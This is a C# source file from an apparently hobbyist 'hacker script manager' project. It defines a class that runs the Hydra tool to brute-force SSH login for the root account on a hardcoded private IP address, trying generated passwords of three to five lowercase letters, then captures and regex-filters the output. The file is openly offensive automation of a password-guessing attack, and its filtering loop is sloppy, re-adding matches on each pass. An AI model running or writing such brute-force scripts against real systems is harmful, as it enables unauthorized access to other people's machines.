using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;

namespace hacker_script_manager
{
    class HydraScript : Script
    {
        private List<string> matchesToSend = new List<String>();
        private List<string> outputs = new List<String>();
        private List<string> actualmessages = new List<String>();
       

        public override List<string> Actualmessages { get => actualmessages; }
        public override List<string> Outputs { get => outputs; }
        public override List<string> MatchesToSend { get => matchesToSend; }

        public override void ShowMatch(string text, string expr)
        {
            MatchCollection mc = Regex.Matches(text, expr);
            foreach (Match m in mc)
            {
                Console.WriteLine(m);
                matchesToSend.Add(Convert.ToString(m));
                foreach (string a in matchesToSend)
                {
                    if (a.Contains("mi"))
                    {

                        actualmessages.Add(a);


                    }

                }


            }
        }

        public override void Start_Script()
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = @"/usr/bin/hydra";
          
            p.StartInfo.Arguments = string.Format("-l root -x 3:5:a 192.168.204.128 -t 4 ssh -v -V");
            p.Start();

            while (!p.StandardOutput.EndOfStream)
            {
                string output = p.StandardOutput.ReadLine();
                Console.WriteLine(output);
                outputs.Add(output);

            }
            foreach (string o in outputs)
            {
                ShowMatch(o, @"\bm\S*");

            }
        }
    }
}
